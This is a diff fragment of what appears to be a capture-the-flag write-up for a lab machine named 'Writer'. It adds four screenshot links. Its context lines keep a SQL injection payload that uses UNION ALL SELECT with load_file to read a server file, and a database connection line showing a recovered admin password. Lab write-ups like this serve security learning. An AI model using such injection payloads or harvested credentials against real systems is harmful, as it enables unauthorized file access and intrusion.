@@ -47,6 +47,11 @@ uname=username' UNION ALL SELECT NULL,load_file("/var/www/writer.htb/writer.wsgi
 ![image](https://user-images.githubusercontent.com/52716721/143479464-bab8af2c-5c28-4e29-bc21-90d08b245957.png)
 ![image](https://user-images.githubusercontent.com/52716721/143479566-63bc8a3a-1baa-404d-bb12-aa454b7ced0a.png)
 connector = mysql.connector.connect(user=&#39;admin&#39;, password=&#39;ToughPasswordToCrack&#39;, host=&#39;127.0.0.1&#39;, database=&#39;writer&#39;)
+![image](https://user-images.githubusercontent.com/52716721/143593570-4da314d9-aa10-49db-b95c-724f8ad3a44f.png)
+![image](https://user-images.githubusercontent.com/52716721/143593639-a6682460-2692-498d-8c02-b000b1827bf3.png)
+![image](https://user-images.githubusercontent.com/52716721/143597265-0dc3a738-8d06-4216-8612-f284a6a84b5a.png)
+![image](https://user-images.githubusercontent.com/52716721/143599339-fb5de575-7cf1-4538-8bd8-96eab3fa917c.png)
+
 
 
 
